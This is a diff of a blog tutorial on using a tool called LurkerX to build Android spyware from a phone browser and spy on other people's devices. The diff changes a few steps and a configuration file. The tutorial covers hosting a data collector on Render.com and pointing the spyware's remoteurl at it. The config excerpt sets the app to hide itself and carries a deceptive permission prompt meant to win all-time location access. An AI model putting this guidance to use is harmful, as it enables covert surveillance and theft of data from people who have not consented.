@@ -1,5 +1,7 @@
  # How to Spy on any Android phone using just Chrome or Safari, October 2026
 
+ <div class="separator" style="clear: both; text-align: center;"><br /></div><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCUEcTGfIIpuAuUmHnRuwnjEQDipkyHQNsyMDEvhhimmqmqxyD-skFr3VVisJFIJawzrkcvx_6AQ8y_WlxIBdp8rJZdrk5ix4IT4PcvExNyZS5pMVLJu94JRn94pkkL3TLjenbtq5eW-GLS6eYWG3Ug3bNxPZKWDRvX4vdyMLH9UJOg8niWrFMfN8PX6G-/s1131/Screenshot_20260801987656789.png" style="margin-left: 1em; margin-right: 1em; text-align: center;"><img border="0" data-original-height="791" data-original-width="1131" height="316" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCUEcTGfIIpuAuUmHnRuwnjEQDipkyHQNsyMDEvhhimmqmqxyD-skFr3VVisJFIJawzrkcvx_6AQ8y_WlxIBdp8rJZdrk5ix4IT4PcvExNyZS5pMVLJu94JRn94pkkL3TLjenbtq5eW-GLS6eYWG3Ug3bNxPZKWDRvX4vdyMLH9UJOg8niWrFMfN8PX6G-/w553-h316/Screenshot_20260801987656789.png" width="553" /></a><br /><div><br /></div>
+
 Did you know that you can spy on any Android Phone using just your browser on your own phone?
 
 LurkerX has been a tool people use to generate spywares for Android devices, but for your information it required a PC like a laptop because that was how it was designed. The recent breakthrough is very surprising, With any device that you are using, you can generate a spyware that can be used to spy on other Android devices. In this post, I would list and explain all that you need to know in spying other Androids using the new LurkerX, so miss no glance if you need to learn how to use the new LurkerX.
@@ -44,10 +46,10 @@ It is those platforms I'd use in this tutorial, though many platforms provides s
 
 10. Go back to your GitHub account. Everything is set, you just need to make sure your generated Spyware would forward all data and information to your Render.com URL. 
 
-11. Click on `choices.ini` and edit it. Make sure to change things like `remoteUrl` and `publicRepoUrl`.
+11. Click on `choices.ini` and edit it. Make sure to change things like `remoteUrl` and `repo_url`.
 
 - `remoteUrl` should be your link from render.com
-- `publicRepoUrl` should be your forked repo's link. In this case mine is `https://github.com/nooby-jayz/LurkerX`.
+- `repo_url` should be your forked repo's link. In this case mine is `https://github.com/nooby-jayz/LurkerX`.
 
 <img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.6.0-9.PNG?raw=true" width="300" height="400">
 <img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.6.0-10.PNG?raw=true" width="300" height="400">
@@ -81,12 +83,14 @@ gpspermissionstring = Allow Location for ALL THE TIME to let the app fake your G
 
 [behavior]
 remoteurl = https://lurkerx-wo5o.onrender.com
-publicRepoUrl= https://github.com/nooby-jayz/LurkerX
 payloadurl = None
 hideapp = true
 
 [decompile]
 from = base.apk
+
+[public]
+repo_url= https://github.com/its-ernest/LurkerX
 
 [sign]
 keystore = mykey.jks
